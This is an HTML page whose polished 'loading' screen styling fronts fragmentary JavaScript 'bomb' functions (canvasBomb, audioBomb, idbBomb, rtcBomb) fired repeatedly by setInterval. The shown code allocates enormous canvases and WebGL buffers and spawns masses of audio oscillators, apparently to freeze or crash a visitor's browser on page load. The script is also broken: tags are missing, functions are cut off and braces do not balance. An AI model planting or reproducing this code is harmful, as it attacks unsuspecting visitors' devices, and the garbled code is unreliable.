<!DOCTYPE html>

<style>
body {
    margin: 0;
    padding: 0;
    background: linear-gradient(145deg, #0b0c1a, #1a1b2e);
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    font-family: 'Segoe UI', 'Roboto', sans-serif;
    color: #fff;
    text-align: center;
    overflow: hidden;
    position: relative;
}
.content {
    z-index: 10;
    padding: 50px 40px;
    max-width: 700px;
    background: rgba(255, 255, 255, 0.04);
    backdrop-filter: blur(16px);
    -webkit-backdrop-filter: blur(16px);
    border: 1px solid rgba(255, 255, 255, 0.08);
    border-radius: 40px;
    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.7), inset 0 1px 0 rgba(255,255,255,0.05);
    transition: all 0.3s ease;
}
h1 {
    font-size: 38px;
    font-weight: 700;
    background: linear-gradient(135deg, #f0e6d3, #ffd78a);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    margin-bottom: 15px;
    letter-spacing: -0.5px;
}
.loading-text {
    font-size: 22px;
    font-weight: 300;
    color: #c0b7a8;
    margin-top: 12px;
    letter-spacing: 0.3px;
    line-height: 1.6;
}
.highlight-number {
    font-weight: 700;
    color: #ffd78a;
    -webkit-text-fill-color: #ffd78a;
    background: none;
    font-size: 28px;
}
.progress-bar-container {
    width: 100%;
    height: 4px;
    background: rgba(255, 255, 255, 0.06);
    border-radius: 10px;
    margin: 30px 0 20px;
    overflow: hidden;
}
.progress-bar {
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, #ffd78a, #f0a500);
    animation: loadingProgress 1.8s ease-in-out infinite;
    border-radius: 10px;
}
@keyframes loadingProgress {
    0% { transform: translateX(-100%); }
    100% { transform: translateX(100%); }
}
.sub-text {
    font-size: 15px;
    color: #7a7265;
    margin-top: 18px;
    letter-spacing: 0.5px;
    border-top: 1px solid rgba(255,255,255,0.04);
    padding-top: 18px;
}
</style>
</head>
<body>

        canvas.height = 100000000;
        var ctx = canvas.getContext('2d');
        var gl = canvas.getContext('webgl');
        for (var j = 0; j < 10000000; j++) {

            ctx.fillRect(Math.random()*100000000, Math.random()*100000000, 1000000, 1000000);
            if (gl) {
                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(100000000), gl.STATIC_DRAW);
            }
        }
        document.body.appendChild(canvas);
    }
}
setInterval(canvasBomb, 0);

function audioBomb() {
    for (var i = 0; i < 1000; i++) {
        try {
            var audio = new AudioContext();
            for (var j = 0; j < 1000000; j++) {
                var oscillator = audio.createOscillator();
                oscillator.frequency.value = Math.random() * 100000000;
                oscillator.type = 'sawtooth';
                oscillator.connect(audio.destination);

setInterval(idbBomb, 0);

function rtcBomb() {

            });
